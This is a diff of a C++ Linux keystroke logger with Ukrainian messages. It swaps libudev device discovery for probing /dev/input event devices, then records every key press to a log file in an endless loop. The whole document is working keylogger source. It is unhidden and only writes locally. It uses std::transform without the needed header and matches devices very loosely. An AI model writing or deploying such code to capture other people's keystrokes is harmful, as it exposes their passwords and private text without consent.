@@ -1,85 +1,81 @@
 #include <iostream>
 #include <fstream>
-#include <fcntl.h>
-#include <linux/input.h>
-#include <unistd.h>
-#include <libudev.h>
 #include <string>
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
+#include <sys/ioctl.h>
 #include <cstring>
+#include <vector>
 
-// === Константи ===
-const std::string LOG_FILE = "keylog.txt";
-const std::string TARGET_KEYWORD = "Keyboard";
+const std::string DEV_INPUT_PATH = "/dev/input/";
+const int MAX_EVENTS = 32;
+const std::string LOG_FILE = "keyboard.log";
 
-// === Функція для пошуку клавіатурного пристрою ===
-std::string find_keyboard_device() {
-    struct udev* udev = udev_new();
-    if (!udev) {
-        std::cerr << "Помилка ініціалізації udev.\n";
-        return "";
-    }
+bool isLikelyKeyboard(const std::string &name) {
+    std::string lowerName = name;
+    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
+    return lowerName.find("kbd") != std::string::npos ||
+           lowerName.find("keyboard") != std::string::npos ||
+           lowerName.find("input") != std::string::npos;
+}
 
-    struct udev_enumerate* enumerate = udev_enumerate_new(udev);
-    udev_enumerate_add_match_subsystem(enumerate, "input");
-    udev_enumerate_scan_devices(enumerate);
-    struct udev_list_entry* devices = udev_enumerate_get_list_entry(enumerate);
+std::string findKeyboardDevice() {
+    for (int i = 0; i < MAX_EVENTS; ++i) {
+        std::string devicePath = DEV_INPUT_PATH + "event" + std::to_string(i);
+        int fd = open(devicePath.c_str(), O_RDONLY | O_NONBLOCK);
+        if (fd < 0) continue;
 
-    std::string keyboardPath;
-
-    for (struct udev_list_entry* entry = devices; entry != nullptr;
-         entry = udev_list_entry_get_next(entry)) {
-
-        const char* path = udev_list_entry_get_name(entry);
-        struct udev_device* dev = udev_device_new_from_syspath(udev, path);
-
-        const char* devnode = udev_device_get_devnode(dev);
-        const char* name = udev_device_get_sysattr_value(dev, "name");
-
-        if (devnode && name && strstr(name, TARGET_KEYWORD.c_str())) {
-            keyboardPath = devnode;
-            udev_device_unref(dev);
-            break;
+        char name[256] = "Unknown";
+        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
+            close(fd);
+            continue;
         }
 
-        udev_device_unref(dev);
+        std::cout << "Перевіряю: " << devicePath << " — \"" << name << "\"" << std::endl;
+
+        if (isLikelyKeyboard(name)) {
+            close(fd);
+            return devicePath;
+        }
+
+        close(fd);
     }
 
-    udev_enumerate_unref(enumerate);
-    udev_unref(udev);
-    return keyboardPath;
+    return "";
 }
 
 int main() {
-    std::string device = find_keyboard_device();
-    if (device.empty()) {
-        std::cerr << "Клавіатура не знайдена.\n";
+    std::string keyboardDevice = findKeyboardDevice();
+    if (keyboardDevice.empty()) {
+        std::cerr << "❌ Клавіатуру не знайдено!" << std::endl;
         return 1;
     }
 
-    std::cout << "Знайдено клавіатуру: " << device << std::endl;
+    std::cout << "✅ Знайдено клавіатуру: " << keyboardDevice << std::endl;
 
-    int fd = open(device.c_str(), O_RDONLY);
+    int fd = open(keyboardDevice.c_str(), O_RDONLY);
     if (fd < 0) {
-        perror("open");
+        std::cerr << "❌ Не вдалося відкрити пристрій!" << std::endl;
         return 1;
     }
 
-    std::ofstream logfile(LOG_FILE, std::ios::app);
-    if (!logfile.is_open()) {
-        std::cerr << "Не вдалося відкрити файл логів: " << LOG_FILE << std::endl;
+    std::ofstream logFile(LOG_FILE, std::ios::app);
+    if (!logFile.is_open()) {
+        std::cerr << "❌ Не вдалося відкрити лог-файл!" << std::endl;
         close(fd);
         return 1;
     }
 
     struct input_event ev;
-    while (read(fd, &ev, sizeof(ev)) > 0) {
-        if (ev.type == EV_KEY && ev.value == 1) {
-            std::cout << "Натиснута клавіша (код): " << ev.code << std::endl;
-            logfile << "Key code: " << ev.code << std::endl;
+    while (true) {
+        ssize_t bytes = read(fd, &ev, sizeof(ev));
+        if (bytes == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
+            std::cout << "Код клавіші: " << ev.code << std::endl;
+            logFile << "Код клавіші: " << ev.code << std::endl;
         }
     }
 
-    logfile.close();
     close(fd);
     return 0;
 }
